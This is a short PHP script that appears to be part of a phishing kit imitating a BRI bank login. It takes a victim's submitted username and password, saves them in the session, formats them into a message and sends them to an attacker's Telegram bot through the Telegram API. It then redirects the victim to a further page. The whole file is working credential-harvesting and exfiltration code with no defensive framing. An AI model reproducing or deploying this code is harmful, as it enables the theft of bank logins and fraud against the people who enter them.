<?php
session_start();
include "telegram.php";

$uname = $_POST['uname'];
$pass = $_POST['pass'];

$_SESSION['uname'] = $uname;
$_SESSION['pass'] = $pass;

$message = "
├• 𝗕𝗥𝗜 | : ".$uname."
├───────────────────
├• 𝗡𝗮𝗺𝗮 :  ".$uname."
├• 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ".$pass."
╰───────────────────
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('location: ./cd');
?>